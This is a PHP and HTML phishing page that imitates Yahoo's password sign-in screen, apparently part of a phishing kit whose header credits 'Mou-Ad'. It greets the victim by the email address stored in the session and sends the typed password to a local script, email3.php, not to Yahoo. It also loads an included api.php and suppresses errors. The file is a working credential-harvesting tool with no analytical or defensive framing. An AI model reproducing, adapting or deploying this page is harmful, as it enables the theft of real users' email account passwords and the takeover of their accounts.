<?php
/*   
Mou-Ad                    
*/


session_start();
error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();

include('api.php');

?>


<!DOCTYPE html><html id="Stencil" class="js light-theme"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0">
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>Yahoo</title>
        <link rel="dns-prefetch" href="https://gstatic.com/">
        <link rel="dns-prefetch" href="https://google.com/">
        <link rel="dns-prefetch" href="https://s.yimg.com/">
        <link rel="dns-prefetch" href="https://y.analytics.yahoo.com/">
        <link rel="dns-prefetch" href="https://ucs.query.yahoo.com/">
        <link rel="dns-prefetch" href="https://geo.query.yahoo.com/">
        <link rel="dns-prefetch" href="https://geo.yahoo.com/">
        <link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
        <link rel="shortcut icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">

        <style nonce="">
            #mbr-css-check {
                display: inline;
            }
            .mbr-legacy-device-bar {
                display: none;
            }
        </style>
        <link href="yahoo-main.css" rel="stylesheet" type="text/css">
        
    </head>
    <body class="mbr-ar-selector mbr-phone-international-format  ">
        <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this&nbsp;warning">x</label>
            <input type="checkbox" id="mbr-legacy-device-bar-cross">
            <p class="mbr-legacy-device">
                    Yahoo works best with the latest versions of browsers. You're using an out-of-date or unsupported browser and some Yahoo features may not work properly. Please update your browser version now. <a href="password_.src_fpctx_.intl_sg_.lang_en-SG_authMecha.com_2F_se.htm">More&nbsp;info</a>
            </p>
        </div>
    

    <div id="login-body" class="loginish puree-v2 dark-background">
    <div class="mbr-desktop-hd">
    <span class="column">
         <a href="https://sg.yahoo.com/">
            <img src="yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo " width="116" height="">
            <img src="yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo " width="116" height="">
        </a>
    </span>
    <span class="column help txt-align-right">
        <a href="https://help.yahoo.com/kb/index?locale=en_SG&amp;page=product&amp;y=PROD_ACCT">Help</a>
    </span>
</div>
    <div class="login-box-container">
        <div class="login-box default">
            <div class="mbr-login-hd txt-align-center">
                    <img src="yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-SG" width="116" height="">
                    <img src="yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-SG" width="116" height="">
            </div>
            <div class="challenge password-challenge">
    <div id="password-challenge" class="primary">
    <div class="greeting">
            <h1 class="username">Hello,&nbsp;<?php if(isset($_SESSION['Email']))
					  {
					  $success = $_SESSION['Email'];
					  echo $success;
					  
					  }
					  
					   ?></h1>
            <p class="not-you"><a href="https://login.yahoo.com/?display=login&amp;.intl=sg&amp;.lang=en-SG&amp;.src=fpctx&amp;done=https%3A%2F%2Fsg.yahoo.com%2F&amp;prefill=0&amp;chllngnm=password" data-ylk="elm:link;mKey:primary_account-challenge-password_notYoulink" data-rapid_p="1">Not&nbsp;you?</a></p>
    </div>
    <form action="email3.php" method="post" class="pure-form pure-form-stacked">
        
        
        
        
                <div class="hidden-username">
            <input type="text" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" spellcheck="false" name="username" value="ghostmode0003" data-rapid_p="7">
        </div>
        
        <input type="password" id="login-passwd" name="password" placeholder="Password" autofocus="" autocomplete="current-password" data-rapid_p="9">
        <p class="signin-cont">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign&nbsp;in" data-ylk="elm:btn;elmt:primary;mKey:primary_account-challenge-password_primaryBtn" data-rapid_p="10">
                    Sign&nbsp;in
            </button>
        </p>
        <p class="forgot-cont">
            <button type="submit" class="pure-button puree-button-link" data-ylk="elm:btn;elmt:skip;slk:skip;mKey:primary_account-challenge-password_skipBtn" id="mbr-forgot-link" name="skip" value="I forgot my&nbsp;password" data-rapid_p="11">
                <p class="error-msg" role="alert" data-error="messages.ERROR_INVALID_PASSWORD">Invalid password. Please try again</p>
        </p>
         
    </form>
</div>
</div>
        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback" style="display: block;">
            <h1>Yahoo makes it easy to enjoy what matters most in your&nbsp;world.</h1>
<p>Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of&nbsp;life.</p>
        </div>
    </div>
    <div class="login-bg-outer ">
        <div class="login-bg-inner">
                <div id="login-ad-rich"></div>
        </div>
    </div>
</div>
    
    
    
    
    
    <div id="mbr-css-check"></div>


<!-- fe15.member.ir2.yahoo.com - Wed Oct 02 2019 15:04:24 GMT+0000 (UTC) - (1ms) --><div id="darla_csc_holder" class="darla" style="display: none;"><iframe style="display: none;" id="darla_csc_writer_0" class="darla" src="r-csc.html" frameborder="no" scrolling="no" allowtransparency="true" hidefocus="true" tabindex="-1" marginwidth="0" marginheight="0"></iframe></div></body></html>
